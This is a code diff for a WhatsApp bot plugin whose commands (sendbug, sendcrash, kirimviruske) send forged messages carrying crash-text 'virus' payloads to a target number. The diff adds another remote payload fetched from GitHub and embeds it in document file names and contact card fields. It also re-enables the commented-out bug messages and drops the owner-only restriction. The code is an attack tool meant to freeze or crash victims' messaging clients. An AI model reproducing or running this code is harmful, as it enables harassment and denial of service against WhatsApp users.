@@ -15,6 +15,7 @@ if (!text)return conn.send2ButtonImg(m.chat, `https://telegra.ph/file/c080917609
 let thumb = fs.readFileSync('./thumbnail.jpg')
 let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
 let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
+let viruswan = await (await fetch("https://raw.githubusercontent.com/WannBotz/virus/main/virtex1.txt")).text()
 let type = (args[0] || '').toLowerCase()
 const from = m.key.remoteJid
 //const participants = m.isGroup ? await groupMetadata.participants : ''
@@ -123,7 +124,7 @@ contextInfo: {"forwardingScore":999,"isForwarded":true},
 sendEphemeral: true}	
 //=================================================//	
 // doc
-/*const doc = { 
+const doc = { 
 key: {
 fromMe: false, 
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
@@ -136,10 +137,10 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `HW MODS WA${ngazap(prefix)}`,
+"fileName": `${viruswan}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }}}
-//# Sticker
+ //Sticker
 const bugstik = { 
         key: { 
             fromMe: false, 
@@ -153,14 +154,14 @@ const bugstik = {
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `${wm}`,
-"orderTitle": `${wm}`,
+"message": `${gcname}`,
+"orderTitle": `${gcname}`,
 "sellerJid": "62857887347569@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR"
             } 
-        }}*/
+        }}
 //=================================================//
 //# Pdf
 const bugpdf = { 
@@ -237,7 +238,7 @@ const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 }), { userJid: m.chat, quoted: ftrolii })    
 //=================================================//    
 //# Contact
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${wm}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${wm}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${wm}${viruswan}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${wm}${viruswan}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
 //=================================================//   
 //# Text
 const main = {
@@ -381,6 +382,6 @@ handler.help = ['sendbug <number>']
 handler.tags = ['virus']
 handler.command = /^(kirimviruske|sendcrash|sendbug|sendtroli)$/i
 handler.premium = true
-handler.owner = true
+handler.owner = false
 
 export default handler
